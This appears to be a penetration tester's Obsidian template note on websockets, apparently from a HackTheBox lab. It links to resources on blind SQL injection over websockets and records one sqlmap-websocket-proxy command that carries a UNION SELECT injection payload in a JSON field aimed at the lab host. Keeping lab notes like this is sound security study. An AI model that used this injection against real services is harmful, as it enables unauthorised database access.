---
creation date: March 22nd 2023
last modified date: March 22nd 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Websockets]]  
___

## Description:  

[Blind SQL injection over websockets](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

[Good websocket proxy for sqlmap](https://github.com/BKreisel/sqlmap-websocket-proxy)

Used the following to escape quotes in Json requests:
`/home/kali/.local/bin/sqlmap-websocket-proxy -u "ws://ws.qreader.htb:5789/version" -p '{"version": "\" union select 1,2,3,%param%--"}' --json -o 8085`


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: March 22nd 2023 (09:10 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
